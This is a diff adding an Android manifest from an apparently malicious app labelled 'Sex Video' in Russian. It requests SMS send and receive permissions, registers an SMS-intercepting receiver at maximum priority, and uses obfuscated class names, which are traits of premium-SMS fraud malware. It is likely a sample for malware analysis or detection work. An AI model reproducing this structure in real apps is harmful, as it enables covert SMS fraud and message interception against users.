@@ -1,0 +1,32 @@
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="4" android:versionName="1.3" android:installLocation="2" package="name.tbx.erndy">
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"></uses-permission>
+    <uses-permission android:name="android.permission.SEND_SMS"></uses-permission>
+    <uses-permission android:name="android.permission.INTERNET"></uses-permission>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"></uses-permission>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"></uses-permission>
+    <uses-permission android:name="android.permission.WAKE_LOCK"></uses-permission>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"></uses-permission>
+    <uses-sdk android:minSdkVersion="4" android:targetSdkVersion="19"></uses-sdk>
+    <application android:theme="@1030007" android:label="Секс Видео" android:icon="@7f020004" android:name=".wclxcwb" android:allowBackup="false">
+        <activity android:icon="@7f020004" android:name=".activity.fkkfryylio" android:launchMode="2" android:screenOrientation="0" android:configChanges="0xa0">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"></action>
+                <category android:name="android.intent.category.LAUNCHER"></category>
+            </intent-filter>
+        </activity>
+        <activity android:name=".activity.䖲" android:screenOrientation="0" android:configChanges="0x4a0"></activity>
+        <activity android:theme="@7f070002" android:name="dctfya.android.android.android.android.android.䖲" android:screenOrientation="2" android:configChanges="0x4b0"></activity>
+        <receiver android:name=".mjzycdhie">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"></action>
+            </intent-filter>
+        </receiver>
+        <service android:name=".䴵"></service>
+        <activity android:name="android.android.android.䖲"></activity>
+        <activity android:name="bnqc.dctfya.android.䖲"></activity>
+        <activity android:name="bnqc.android.android.android.䖲"></activity>
+        <activity android:name="tyl.android.android.android.android.android.䖲"></activity>
+        <activity android:name="name.android.android.android.android.android.android.android.䖲"></activity>
+        <activity android:name="tv.dctfya.android.䖲"></activity>
+    </application>
+</manifest>
